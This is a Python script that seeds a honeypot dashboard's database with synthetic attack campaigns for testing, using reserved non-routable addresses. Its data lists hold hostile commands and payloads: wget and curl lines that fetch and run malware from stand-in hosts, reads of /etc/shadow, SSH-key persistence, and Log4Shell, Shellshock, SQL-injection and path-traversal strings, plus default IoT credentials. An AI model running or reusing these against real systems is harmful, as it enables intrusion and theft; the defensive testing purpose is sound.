"""Generate a realistic synthetic dataset.

    python -m tools.seed_fake_data --days 14 --attackers 180

Populates the database with campaigns that behave like the real thing — brute
forcers that grind, botnet loaders that get in and run a script, scanners that
walk a wordlist — so the dashboard, the rules and the scoring model can all be
exercised without pointing a sensor at the internet and waiting a week.

Two safety properties, both deliberate:

**Every generated source address is from a reserved range.** RFC 5737 TEST-NET-1/2/3
and RFC 2544 benchmarking space. None of them is routable, so a demo dataset can
never cause someone to blocklist, report or investigate a real network — which is
exactly what would happen if this seeded plausible-looking public addresses.

**Every generated row is labelled.** Geo and ASN enrichment run in synthetic mode,
stamping ``geo_source="synthetic"`` and a private-use ASN. Nothing here can be
mistaken downstream for a measurement.
"""

from __future__ import annotations

import argparse
import datetime as dt
import ipaddress
import random
import sys
import uuid
from typing import Any, Iterator, Optional

from pipeline.enrichment import enrich_event
from storage.db import init_db, session_scope
from storage.models import Event, EventType, Service, Session, Severity, utcnow

# Reserved, non-routable ranges. See the module docstring.
SOURCE_POOLS = [
    ipaddress.ip_network("192.0.2.0/24"),      # RFC 5737 TEST-NET-1
    ipaddress.ip_network("198.51.100.0/24"),   # RFC 5737 TEST-NET-2
    ipaddress.ip_network("203.0.113.0/24"),    # RFC 5737 TEST-NET-3
    ipaddress.ip_network("198.18.0.0/16"),     # RFC 2544 benchmarking
]

USERNAMES = [
    "root", "admin", "administrator", "user", "test", "ubuntu", "oracle", "postgres",
    "mysql", "ftp", "guest", "support", "pi", "deploy", "git", "jenkins", "www-data",
    "backup", "operator", "service", "dev", "webmaster", "nagios", "zabbix", "elastic",
]

PASSWORDS = [
    "123456", "password", "admin", "root", "12345678", "qwerty", "1234", "123456789",
    "letmein", "welcome", "changeme", "P@ssw0rd", "admin123", "toor", "pass", "test",
    "1qaz2wsx", "raspberry", "ubnt", "default", "system", "abc123", "master", "111111",
]

IOT_CREDS = [
    ("root", "xc3511"), ("root", "vizxv"), ("root", "admin"), ("admin", "admin"),
    ("root", "888888"), ("root", "xmhdipc"), ("support", "support"), ("root", "juantech"),
]

SCAN_PATHS = [
    "/", "/admin", "/admin/login.php", "/wp-login.php", "/wp-admin/", "/phpmyadmin/",
    "/.env", "/.git/config", "/config.php", "/backup.sql", "/server-status",
    "/api/v1/users", "/actuator/env", "/solr/admin/cores", "/cgi-bin/test.cgi",
    "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", "/shell.php", "/xmlrpc.php",
    "/manager/html", "/console", "/jenkins/script", "/.aws/credentials", "/robots.txt",
    "/index.php?s=/Index/\\think\\app/invokefunction", "/boaform/admin/formLogin",
    "/HNAP1/", "/setup.cgi", "/dns-query", "/owa/auth/logon.aspx", "/telescope/requests",
]

USER_AGENTS = [
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36",
    "curl/7.81.0",
    "python-requests/2.31.0",
    "Go-http-client/1.1",
    "Mozilla/5.0 zgrab/0.x",
    "masscan/1.3",
    "Nikto/2.5.0",
    "sqlmap/1.7.2#stable (https://sqlmap.org)",
    "Mozilla/5.0 (compatible; Nmap Scripting Engine)",
    "Hello, World",
    "libwww-perl/6.67",
]

SHELL_SEQUENCES = {
    "iot_botnet": [
        "/bin/busybox ECCHI",
        "cat /proc/mounts",
        "cat /bin/echo",
        "/bin/busybox wget http://198.51.100.77/bins/mirai.arm7 -O /tmp/x",
        "chmod +x /tmp/x",
        "/tmp/x",
        "rm -rf /tmp/x",
    ],
    "cryptominer": [
        "uname -a",
        "cat /proc/cpuinfo | grep 'model name'",
        "nproc",
        "curl -s http://203.0.113.201/setup.sh -o /tmp/s.sh",
        "chmod 777 /tmp/s.sh",
        "sh /tmp/s.sh",
        "crontab -l",
    ],
    "recon": [
        "whoami", "id", "uname -a", "cat /etc/passwd", "ls -la /root",
        "cat /root/.ssh/authorized_keys", "netstat -antp", "ps aux", "df -h",
        "cat /etc/shadow", "history",
    ],
    "persistence": [
        "id",
        "mkdir -p /root/.ssh",
        "echo 'ssh-rsa AAAAB3NzaC1yc2EA...' >> /root/.ssh/authorized_keys",
        "chmod 600 /root/.ssh/authorized_keys",
        "crontab -l",
        "systemctl status sshd",
    ],
}

EXPLOIT_PAYLOADS = [
    ("/", "${jndi:ldap://198.18.0.44:1389/Basic/Command/Base64/d2hvYW1p}", ["log4shell"], Severity.CRITICAL),
    ("/index.php?id=1' UNION SELECT username,password FROM users--", None, ["sql-injection"], Severity.HIGH),
    ("/../../../../etc/passwd", None, ["path-traversal"], Severity.HIGH),
    ("/cgi-bin/test.cgi", "() { :; }; /bin/bash -c 'id'", ["shellshock", "cgi-probe"], Severity.CRITICAL),
    ("/upload/shell.php", None, ["webshell-upload"], Severity.CRITICAL),
    ("/.env", None, ["env-file-probe"], Severity.HIGH),
]


class Seeder:
    """Generates one coherent dataset."""

    def __init__(self, rng: random.Random, days: float, sensor: str = "seed") -> None:
        self.rng = rng
        self.days = days
        self.sensor = sensor
        self.now = utcnow()
        self.start = self.now - dt.timedelta(days=days)
        self.events: list[dict[str, Any]] = []
        self.sessions: list[dict[str, Any]] = []

    # -- helpers --------------------------------------------------------- #

    def random_ip(self) -> str:
        network = self.rng.choice(SOURCE_POOLS)
        size = network.num_addresses
        offset = self.rng.randrange(1, min(size - 1, 65534))
        return str(network.network_address + offset)

    def random_time(self, bias_hours: Optional[int] = None) -> dt.datetime:
        """A timestamp in the window.

        ``bias_hours`` concentrates a campaign around a UTC hour, which is what
        makes the weekday/hour heatmap show anything interesting — real campaigns
        are not uniformly distributed across the clock.
        """
        span = (self.now - self.start).total_seconds()
        ts = self.start + dt.timedelta(seconds=self.rng.uniform(0, span))
        if bias_hours is not None:
            ts = ts.replace(hour=(bias_hours + self.rng.randint(-2, 2)) % 24)
        return ts

    def new_session(
        self, src_ip: str, service: str, started: dt.datetime, dst_port: int
    ) -> str:
        session_id = str(uuid.uuid4())
        self.sessions.append(
            {
                "session_id": session_id,
                "sensor": self.sensor,
                "service": service,
                "src_ip": src_ip,
                "src_port": self.rng.randint(1024, 65535),
                "dst_port": dst_port,
                "started_at": started,
            }
        )
        return session_id

    def add_event(self, **kwargs: Any) -> None:
        event = {
            "event_id": str(uuid.uuid4()),
            "sensor": self.sensor,
            "severity": Severity.INFO.value,
            "tags": [],
            "extra": {},
            "payload_size": 0,
        }
        event.update(kwargs)
        self.events.append(event)

    # -- campaign generators --------------------------------------------- #

    def ssh_bruteforce(self, src_ip: str) -> None:
        """A grinder: many attempts, one service, mostly generic usernames."""
        bursts = self.rng.randint(1, 4)
        for _ in range(bursts):
            started = self.random_time(bias_hours=self.rng.randint(0, 23))
            session_id = self.new_session(src_ip, "ssh", started, 22)
            attempts = self.rng.randint(15, 90)
            focused = self.rng.random() < 0.4  # one account vs. a username list
            username = self.rng.choice(USERNAMES)

            for i in range(attempts):
                ts = started + dt.timedelta(seconds=i * self.rng.uniform(0.3, 2.5))
                self.add_event(
                    ts=ts,
                    session_id=session_id,
                    service="ssh",
                    event_type=EventType.AUTH_ATTEMPT.value,
                    severity=Severity.MEDIUM.value,
                    src_ip=src_ip,
                    dst_port=22,
                    username=username if focused else self.rng.choice(USERNAMES),
                    password=self.rng.choice(PASSWORDS),
                    tags=["ssh-password"],
                )

    def telnet_botnet(self, src_ip: str) -> None:
        """A loader: short credential list, then a scripted shell sequence."""
        started = self.random_time()
        session_id = self.new_session(src_ip, "telnet", started, 23)
        offset = 0.0

        for username, password in self.rng.sample(IOT_CREDS, k=self.rng.randint(2, 5)):
            offset += self.rng.uniform(0.5, 2.0)
            self.add_event(
                ts=started + dt.timedelta(seconds=offset),
                session_id=session_id,
                service="telnet",
                event_type=EventType.AUTH_ATTEMPT.value,
                severity=Severity.HIGH.value,
                src_ip=src_ip,
                dst_port=23,
                username=username,
                password=password,
                tags=["iot-default-credential"],
            )

        offset += 1.0
        self.add_event(
            ts=started + dt.timedelta(seconds=offset),
            session_id=session_id,
            service="telnet",
            event_type=EventType.AUTH_SUCCESS.value,
            severity=Severity.HIGH.value,
            src_ip=src_ip,
            dst_port=23,
            username="root",
            tags=["shell-granted"],
        )

        for command in SHELL_SEQUENCES["iot_botnet"]:
            offset += self.rng.uniform(0.2, 1.5)
            tags = ["mirai-signature"] if "busybox" in command else []
            if any(k in command for k in ("wget", "curl", "tftp")):
                tags += ["payload-fetch", "second-stage-url"]
            self.add_event(
                ts=started + dt.timedelta(seconds=offset),
                session_id=session_id,
                service="telnet",
                event_type=EventType.COMMAND.value,
                severity=Severity.CRITICAL.value,
                src_ip=src_ip,
                dst_port=23,
                username="root",
                command=command,
                tags=tags,
            )

    def web_scan(self, src_ip: str) -> None:
        """A scanner walking a path wordlist."""
        started = self.random_time()
        session_id = self.new_session(src_ip, "http", started, 80)
        user_agent = self.rng.choice(USER_AGENTS)
        paths = self.rng.sample(SCAN_PATHS, k=min(len(SCAN_PATHS), self.rng.randint(18, 30)))

        for i, path in enumerate(paths):
            status = 200 if path in ("/", "/robots.txt", "/admin", "/.env") else 404
            tags = []
            severity = Severity.LOW
            if "/.env" in path or "/.git" in path or "/.aws" in path:
                tags, severity = ["env-file-probe"], Severity.HIGH
            elif "/cgi-bin/" in path:
                tags, severity = ["cgi-probe"], Severity.MEDIUM
            elif any(k in path for k in ("/admin", "/wp-", "/phpmyadmin", "/manager")):
                tags, severity = ["admin-probe"], Severity.LOW

            self.add_event(
                ts=started + dt.timedelta(seconds=i * self.rng.uniform(0.1, 0.8)),
                session_id=session_id,
                service="http",
                event_type=EventType.HTTP_REQUEST.value,
                severity=severity.value,
                src_ip=src_ip,
                dst_port=80,
                http_method="GET",
                path=path,
                user_agent=user_agent,
                status_code=status,
                tags=tags,
            )

    def exploit_attempt(self, src_ip: str) -> None:
        """A source firing known exploit payloads at the web service."""
        started = self.random_time()
        session_id = self.new_session(src_ip, "http", started, 80)
        user_agent = self.rng.choice(USER_AGENTS)

        for i, (path, payload, tags, severity) in enumerate(
            self.rng.sample(EXPLOIT_PAYLOADS, k=self.rng.randint(2, len(EXPLOIT_PAYLOADS)))
        ):
            body = (payload or "").encode()
            self.add_event(
                ts=started + dt.timedelta(seconds=i * self.rng.uniform(1, 10)),
                session_id=session_id,
                service="http",
                event_type=EventType.HTTP_REQUEST.value,
                severity=severity.value,
                src_ip=src_ip,
                dst_port=80,
                http_method="POST" if payload else "GET",
                path=path,
                user_agent=user_agent,
                status_code=404,
                headers={"user-agent": payload} if payload and "shellshock" in tags else None,
                payload_size=len(body),
                tags=tags,
            )

    def targeted_intrusion(self, src_ip: str) -> None:
        """The rare, valuable one: gets in and works by hand."""
        started = self.random_time()
        session_id = self.new_session(src_ip, "ssh", started, 22)
        username = self.rng.choice(["root", "deploy", "ubuntu"])
        offset = 0.0

        for _ in range(self.rng.randint(2, 6)):
            offset += self.rng.uniform(1, 4)
            self.add_event(
                ts=started + dt.timedelta(seconds=offset),
                session_id=session_id, service="ssh",
                event_type=EventType.AUTH_ATTEMPT.value,
                severity=Severity.MEDIUM.value,
                src_ip=src_ip, dst_port=22,
                username=username, password=self.rng.choice(PASSWORDS),
                tags=["ssh-password"],
            )

        offset += 2
        self.add_event(
            ts=started + dt.timedelta(seconds=offset),
            session_id=session_id, service="ssh",
            event_type=EventType.AUTH_SUCCESS.value,
            severity=Severity.HIGH.value,
            src_ip=src_ip, dst_port=22, username=username,
            tags=["shell-granted"],
        )

        sequence = SHELL_SEQUENCES[self.rng.choice(["recon", "persistence", "cryptominer"])]
        for command in sequence:
            # Human typing cadence: seconds between commands, not milliseconds.
            offset += self.rng.uniform(3, 25)
            tags = []
            if any(k in command for k in ("wget", "curl")):
                tags = ["payload-fetch", "second-stage-url"]
            self.add_event(
                ts=started + dt.timedelta(seconds=offset),
                session_id=session_id, service="ssh",
                event_type=EventType.COMMAND.value,
                severity=Severity.CRITICAL.value if tags else Severity.HIGH.value,
                src_ip=src_ip, dst_port=22, username=username,
                command=command, tags=tags,
            )

    def ftp_probe(self, src_ip: str) -> None:
        started = self.random_time()
        session_id = self.new_session(src_ip, "ftp", started, 21)
        for i, (username, password) in enumerate(
            [("anonymous", "anonymous@"), ("ftp", "ftp"), ("admin", "admin")]
        ):
            self.add_event(
                ts=started + dt.timedelta(seconds=i * 2),
                session_id=session_id, service="ftp",
                event_type=EventType.AUTH_ATTEMPT.value,
                severity=Severity.MEDIUM.value,
                src_ip=src_ip, dst_port=21,
                username=username, password=password,
                tags=["ftp-anonymous" if username in ("anonymous", "ftp") else "ftp-user"],
            )

    def quiet_probe(self, src_ip: str) -> None:
        """Background noise: a connect or two and nothing more."""
        service = self.rng.choice(["ssh", "telnet", "http", "ftp"])
        port = {"ssh": 22, "telnet": 23, "http": 80, "ftp": 21}[service]
        started = self.random_time()
        session_id = self.new_session(src_ip, service, started, port)
        for i in range(self.rng.randint(1, 3)):
            self.add_event(
                ts=started + dt.timedelta(seconds=i),
                session_id=session_id, service=service,
                event_type=EventType.CONNECT.value,
                severity=Severity.INFO.value,
                src_ip=src_ip, dst_port=port,
                tags=[],
            )

    # -- orchestration ---------------------------------------------------- #

    #: Campaign mix. Weighted to match what a real sensor sees: mostly noise and
    #: brute force, with genuine intrusions being rare.
    MIX = [
        ("quiet_probe", 30),
        ("ssh_bruteforce", 25),
        ("web_scan", 18),
        ("telnet_botnet", 12),
        ("ftp_probe", 7),
        ("exploit_attempt", 6),
        ("targeted_intrusion", 2),
    ]

    def generate(self, attacker_count: int) -> None:
        names = [name for name, _ in self.MIX]
        weights = [weight for _, weight in self.MIX]

        used: set[str] = set()
        for _ in range(attacker_count):
            src_ip = self.random_ip()
            while src_ip in used:
                src_ip = self.random_ip()
            used.add(src_ip)
            getattr(self, self.rng.choices(names, weights=weights, k=1)[0])(src_ip)

        self.events.sort(key=lambda e: e["ts"])

    def finalise_sessions(self) -> None:
        """Fill in per-session counters from the events actually generated."""
        by_session: dict[str, list[dict[str, Any]]] = {}
        for event in self.events:
            by_session.setdefault(event["session_id"], []).append(event)

        for session in self.sessions:
            events = by_session.get(session["session_id"], [])
            if not events:
                session["ended_at"] = session["started_at"]
                session["duration_ms"] = 0
                continue
            timestamps = [e["ts"] for e in events]
            session["ended_at"] = max(timestamps)
            session["duration_ms"] = int(
                (max(timestamps) - session["started_at"]).total_seconds() * 1000
            )
            session["event_count"] = len(events)
            session["auth_attempts"] = sum(
                1 for e in events if e["event_type"] == EventType.AUTH_ATTEMPT.value
            )
            session["commands_run"] = sum(
                1 for e in events if e["event_type"] == EventType.COMMAND.value
            )
            session["bytes_in"] = sum(self.rng.randint(40, 400) for _ in events)
            session["country"] = events[0].get("country")
            session["asn"] = events[0].get("asn")


def main(argv: Optional[list[str]] = None) -> int:
    parser = argparse.ArgumentParser(description="Seed synthetic honeypot data")
    parser.add_argument("--attackers", type=int, default=150, help="distinct source IPs")
    parser.add_argument("--days", type=float, default=14.0, help="how far back to spread events")
    parser.add_argument("--seed", type=int, default=1337, help="RNG seed for reproducibility")
    parser.add_argument("--sensor", default="seed", help="sensor name stamped on events")
    parser.add_argument("--wipe", action="store_true", help="drop existing tables first")
    parser.add_argument("--no-detect", action="store_true", help="skip the detection pass")
    args = parser.parse_args(argv)

    if args.attackers < 1:
        print("--attackers must be at least 1", file=sys.stderr)
        return 2

    init_db(drop=args.wipe)

    rng = random.Random(args.seed)
    seeder = Seeder(rng, days=args.days, sensor=args.sensor)

    print(f"generating {args.attackers} attackers over {args.days:g} days...")
    seeder.generate(args.attackers)

    print(f"enriching {len(seeder.events):,} events (synthetic geo/ASN)...")
    for event in seeder.events:
        enrich_event(event, synthetic=True)
    seeder.finalise_sessions()

    print(f"writing {len(seeder.sessions):,} sessions and {len(seeder.events):,} events...")
    with session_scope() as db:
        db.add_all(Session(**payload) for payload in seeder.sessions)
        db.flush()
        # Chunked so a large seed does not build one enormous transaction.
        for start in range(0, len(seeder.events), 1000):
            db.add_all(Event(**payload) for payload in seeder.events[start : start + 1000])
            db.flush()

    from storage import queries

    print("rebuilding attacker aggregates...")
    with session_scope() as db:
        count = queries.rebuild_attackers(db)
    print(f"  {count} attacker records")

    if not args.no_detect:
        from pipeline.detection.rules import run_detection

        print("running detection...")
        with session_scope() as db:
            result = run_detection(db, since_hours=args.days * 24)
        print(
            f"  {result['alerts_created']} alerts created, "
            f"{result['alerts_updated']} updated, from {result['events_evaluated']:,} events"
        )

    print("\ndone. start the API with:  uvicorn api.main:app --reload")
    return 0


if __name__ == "__main__":
    sys.exit(main())
